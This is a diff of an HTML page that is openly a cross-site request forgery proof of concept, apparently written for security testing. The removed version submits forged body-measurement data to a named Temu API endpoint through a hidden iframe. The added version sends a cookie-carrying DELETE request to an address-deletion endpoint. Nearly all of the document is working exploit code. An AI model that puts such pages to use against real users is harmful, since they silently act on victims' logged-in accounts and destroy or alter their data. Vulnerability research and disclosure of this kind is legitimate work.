@@ -1,34 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF PoC - Size Report</title>
+  <title>CSRF PoC - DELETE Address</title>
 </head>
 <body>
-  <h2>CSRF PoC - Manual Submit</h2>
-  <form id="csrfForm" method="POST" action="https://www.temu.com/api/bg-barbera-api/user/size/report" target="hiddenFrame">
-    <textarea name="json" style="display:none;">
-      {
-        "bust_size": 60.152,
-        "size_unit": "IN",
-        "waist_size": 50.761,
-        "hip_size": 60.152,
-        "height": 50.508,
-        "weight": 25.079,
-        "trp_track": null
-      }
-    </textarea>
-    <button type="button" onclick="submitCSRF()">Submit CSRF</button>
-  </form>
-
-  <iframe name="hiddenFrame" style="display:none;"></iframe>
+  <h1>CSRF PoC - Delete Address</h1>
+  <p>Click the button below to manually trigger the DELETE request.</p>
+  <button onclick="sendRequest()">Delete Address</button>
 
   <script>
-    function submitCSRF() {
-      const form = document.getElementById('csrfForm');
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", form.action, true);
-      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-      xhr.send(form.querySelector('textarea').value);
+    function sendRequest() {
+      fetch('/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947', {
+        method: 'DELETE',
+        credentials: 'include', // Send cookies
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        alert('Request sent. Response: ' + data);
+      })
+      .catch(error => {
+        alert('Request failed: ' + error);
+      });
     }
   </script>
 </body>
